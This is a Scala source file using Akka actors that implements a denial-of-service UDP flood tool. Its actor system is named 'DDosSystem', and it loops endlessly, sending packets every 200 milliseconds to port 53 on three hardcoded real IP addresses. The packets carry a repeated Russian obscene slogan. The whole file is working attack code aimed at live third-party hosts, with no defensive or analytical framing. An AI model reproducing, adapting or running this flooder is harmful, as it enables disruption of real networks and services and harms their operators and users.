package hi

import akka.actor.{Actor, ActorSystem, Props}
import hi.Test.file

import java.net.{DatagramPacket, DatagramSocket, InetAddress, InetSocketAddress, Socket, UnknownHostException}
import scala.util.Random

object SyncUDP {

  def main(args: Array[String]): Unit = {
    val system = ActorSystem("DDosSystem")
    val actor = system.actorOf(Props[DosActor], name = "ddosactor")

    var targets = fetchTargetsHost

    val REFRESH_TIME: Int = 10 * 60 * 1000
    var lastUpdate: Long = System.currentTimeMillis()


    while (true) {
      if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
        targets = fetchTargetsHost
        println(s"list updated. size=${file.size}")
        lastUpdate = System.currentTimeMillis()
      }

      targets foreach {
        actor ! HostPort(_, 53)
      }

      Thread.sleep(200)
    }
  }

  def fetchTargetsHost: Seq[String] = {
    //Test.fetchTargets.map(_.split("://")(1)).map(_.split("/").head)
    Seq("217.175.140.71", "217.175.155.12", "217.175.155.100")
  }

  case class HostPort(ip: String, port: Int)

  class DosActor extends Actor {
    val random = new Random()

    def receive = {
      case hp: HostPort =>
        var s: DatagramSocket = null
        try {
          s = new DatagramSocket()
          val ip = InetAddress.getByName(hp.ip)

          val message = ((0 to 90).map(_ => "ХУЙЛО -").mkString("") + random.nextPrintableChar()).getBytes

          val sendPacket = new DatagramPacket(message, message.length, ip, hp.port)
          s.send(sendPacket)
          Thread.sleep(10)
          s.close()
          println(s"Send UDP to the $hp")
        } catch {
          case _: UnknownHostException =>
            println(s"UnknownHostException for the $hp")

          case error =>
            println(s"$error for the $hp")
        } finally {
          s.close()
        }

      case _       =>
        println("huh?")
    }
  }

}
